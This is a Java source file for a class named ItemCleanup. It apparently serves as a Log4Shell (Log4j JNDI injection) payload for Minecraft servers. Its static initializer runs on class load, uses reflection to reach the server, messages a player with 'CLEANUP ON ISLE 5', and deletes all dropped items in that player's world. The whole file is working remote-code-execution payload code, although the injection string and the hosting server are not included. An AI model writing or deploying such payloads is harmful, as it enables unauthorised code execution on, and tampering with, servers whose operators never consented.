import net.minecraft.command.CommandBase;
import net.minecraft.command.ServerCommandManager;
import net.minecraft.entity.Entity;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.ChatType;
import net.minecraft.util.text.TextComponentString;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.concurrent.Callable;

public class ItemCleanup implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            Field managerF = CommandBase.class.getDeclaredField("a");
            managerF.setAccessible(true);
            ServerCommandManager manager = (ServerCommandManager)managerF.get(null);
            Field serverF = ServerCommandManager.class.getDeclaredField("a");
            serverF.setAccessible(true);
            MinecraftServer server = (MinecraftServer)serverF.get(manager);

            int lastIndex = server.getPlayerList().getPlayerList().size()-1;
            if (lastIndex == -1) {
                return null;
            }
            EntityPlayerMP me = server.getPlayerList().getPlayerList().get(lastIndex);

            //EntityPlayerMP me = server.getPlayerList().getPlayerByUsername("Captain_S0L0");

            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nCLEANUP ON ISLE 5\u00a75\u00a7k-|-"), ChatType.SYSTEM));
                for (Entity e : me.getServerWorld().loadedEntityList) {
                    if (e instanceof EntityItem) {
                        e.setDead();
                    }
                }
            }

            server.currentTask = null;
            return null;
        };

        Thread thread = new Thread(() -> {
            try {
                Field managerF = CommandBase.class.getDeclaredField("a");
                managerF.setAccessible(true);
                ServerCommandManager manager = (ServerCommandManager) managerF.get(null);
                Field serverF = ServerCommandManager.class.getDeclaredField("a");
                serverF.setAccessible(true);
                MinecraftServer server = (MinecraftServer) serverF.get(manager);

                if (server == null || !server.isServerRunning() || (server.currentTask != null && server.currentTask.equals("log4j"))) {
                    return;
                }
                server.currentTask = "log4j";
                server.callFromMainThread(submitToMain);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        thread.start();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
